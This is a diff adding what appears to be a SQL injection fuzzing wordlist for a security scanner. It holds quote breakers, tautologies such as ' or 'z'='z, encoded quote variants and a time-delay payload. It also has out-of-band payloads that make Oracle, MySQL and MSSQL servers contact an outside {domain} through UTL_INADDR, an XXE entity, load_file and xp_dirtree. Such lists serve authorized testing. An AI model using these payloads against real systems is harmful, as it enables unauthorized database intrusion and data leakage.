@@ -1,0 +1,61 @@
+'
+''
+\
+\\
+\'
+"
+""
+\"
+' or 'z'='z
+1 or 7=7
+1 and 7=7
+" or "z"="z
+(select 1)
+(select from dual)
+`
+*/
+/*
+-->
+#>
+%27
+%22
+%5c
+À§
+Ä§
+ï¼
+À¢
+Ä¢
+ï¼
+&apos;
+Å
+ï¹¨
+ï¼¼
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+(select load_file('\\\\{domain}\\c'))
+1;EXEC master..xp_dirtree '\\{domain}\s'-- 
+1;EXEC master..xp_dirtree "\\{domain}\s"-- 
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+',0)waitfor delay'0:0:20'--
+@@version
+version()
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+to_timestamp_tz
+tz_offset
